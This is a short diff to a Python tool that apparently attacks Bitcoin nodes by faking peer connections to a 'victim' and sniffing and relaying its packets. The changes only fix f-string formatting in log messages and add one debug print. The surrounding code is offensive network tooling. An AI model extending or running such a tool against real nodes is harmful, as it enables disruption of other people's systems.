@@ -181,7 +181,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		identity_mirror_socket.append(mirror_socket)
 
 	# Listen to the connections for future packets
-	if verbose: print('Attaching packet listener to {interface}')
+	if verbose: print(f'Attaching packet listener to {interface}')
 	try:
 		start_new_thread(sniff, (), {
 			'socket': s,
@@ -193,10 +193,10 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 			'interface': interface
 		})
 	except:
-		print('Error: unable to start thread to sniff interface {interface}')
+		print(f'Error: unable to start thread to sniff interface {interface}')
 	
 	if mirror_socket != None:
-		if verbose: print('Attaching mirror packet listener to {interface}')
+		if verbose: print(f'Attaching mirror packet listener to {interface}')
 		try:
 			start_new_thread(mirror_sniff, (), {
 				'socket': mirror_socket,
@@ -208,7 +208,7 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 				'interface': interface
 			})
 		except:
-			print('Error: unable to start thread to sniff interface {interface}')
+			print(f'Error: unable to start thread to sniff interface {interface}')
 
 
 # Creates a fake connection to the victim
@@ -339,6 +339,7 @@ def mirror_packet_received(msg_raw, socket, orig_socket, from_ip, from_port, to_
 	msg = MsgSerializable.from_bytes(msg_raw)
 
 	# Relay Bitcoin packets that aren't from the victim
+	print(f'MIRROR packet {from_ip}=={attacker_ip}')
 	if from_ip == attacker_ip:
 		print(f'*** Message received ** {msg_type} ** {from_ip} --> {to_ip}')
 		try:
